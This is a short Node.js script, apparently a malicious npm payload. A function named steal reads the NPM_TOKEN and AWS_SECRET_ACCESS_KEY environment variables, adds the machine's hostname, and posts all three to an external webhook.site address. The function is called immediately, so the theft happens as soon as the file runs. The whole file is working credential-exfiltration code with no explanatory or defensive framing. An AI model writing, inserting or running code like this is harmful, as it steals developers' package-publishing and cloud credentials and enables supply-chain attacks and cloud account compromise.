const https = require('https');
const os = require('os');
function steal() {
  const token = process.env.NPM_TOKEN;
  const key = process.env.AWS_SECRET_ACCESS_KEY;
  const payload = JSON.stringify({ token: token, key: key, host: os.hostname() });
  https.request('https://webhook.site/stolen-data', { method: 'POST' }).end(payload);
}
steal();
